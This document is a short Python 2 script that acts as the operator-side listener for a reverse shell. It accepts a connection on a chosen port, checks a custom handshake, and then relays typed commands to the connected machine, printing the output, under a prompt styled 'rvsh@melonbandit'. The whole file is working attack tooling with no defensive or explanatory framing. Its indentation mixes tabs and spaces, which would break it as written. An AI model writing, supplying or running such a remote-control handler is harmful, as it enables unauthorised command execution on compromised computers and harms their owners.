import socket
import sys
s = socket.socket()
port=int(sys.argv[1])
s.bind(("0.0.0.0",port))
s.listen(5)
c, a = s.accept()
checkone=c.recv(64)
if "CLIENT TO SERVER" in str(checkone):
    c.send("OK. SERVER TO CLIENT.")
    checktwo=c.recv(64)
    if "OK. CONNECTION GO." in str(checktwo):
        c.send("REVERSE SHELL LISTENING.")
        x=socket.socket()
        print "[!]Reverse shell connected back and verified handshake."
        while True:
            try:
                command_to_send = raw_input("rvsh@melonbandit:~# ")
	        c.send(command_to_send)
	        output = c.recv(99999)
	        print "[+]Command executed."
                print str(output)
            except KeyboardInterrupt:
                print("User requested interrupt. Shutting down cleanly...")
                print("Closing reverse client.")
                c.send("SC-SHTDWN-XT")
                print("Shutting down server.")
                sys.exit(0)
